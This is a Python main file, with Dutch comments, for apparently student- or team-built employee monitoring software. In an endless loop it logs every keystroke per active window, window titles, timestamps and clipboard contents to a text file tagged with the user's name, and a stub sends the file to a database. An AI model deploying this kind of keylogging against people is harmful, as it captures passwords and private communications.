########################################################################################################################
#               Dit is voor nu het main bestand voor de monitoringssoftware.                                           #
#               Probeer zoveel mogelijk code in functies/classes te plaatsen i.p.v. los.                               #
#               Als het nodig lijkt, bespreek met projectleden of er verschillende .py bestanden nodig zijn.           #
#               - Keano (03-04-2023)                                                                                   #
########################################################################################################################

# Hier alle library imports
import web_and_app_info_logger
import keystrokes_and_clipboard_logger
import os
import datetime
import keyboard as kb

event_string = ''
# Hieronder de relevante code
def main():
    if os.path.isfile("keyboard_events.txt"):
        # Code voor versturen van het bestand naar DB
        print("Bestand is verstuurd naar de database!")

    with open("keyboard_events.txt", 'w') as f:
        f.write("Gebruiker: Keano S." + "\n")  # Keano vervangen met identificerende gebruiker
        f.write("======================================================" + "\n")
        keylogger = keystrokes_and_clipboard_logger.Keylogger()
        last_window_title = None
        new_clipboard = None
        old_clipboard = None

        # TECHNICAL DEBT: Currently does not save the logged keys from the last opened application.
        # This happens because data does not get saved until the previous window != current active windows.
        # Attempts have been made e.g. using kb.record() to fix this, but those have had different drawbacks.
        # For now, this works well enough under the idea that monitored employees will end at the desktop before
        # shutting down their device
        while True:
            active_window, active_window_title = web_and_app_info_logger.active_window_grabber()
            if active_window_title != last_window_title and keylogger.is_recording:
                events_queue = keylogger.stop_keylogger_recording()
                relevant_keys = keylogger.get_down_keypresses(events_queue)
                f.write(f"{relevant_keys} \n")
            elif active_window_title != last_window_title and not keylogger.is_recording:
                keylogger.start_keylogger_recording()
                f.write(f"OPENED {active_window_title} ON {datetime.datetime.now()} \n")
            last_window_title = active_window_title

            old_clipboard,new_clipboard = keystrokes_and_clipboard_logger.copy_clipboard(f, old_clipboard, new_clipboard)

if __name__ == '__main__':
    main()
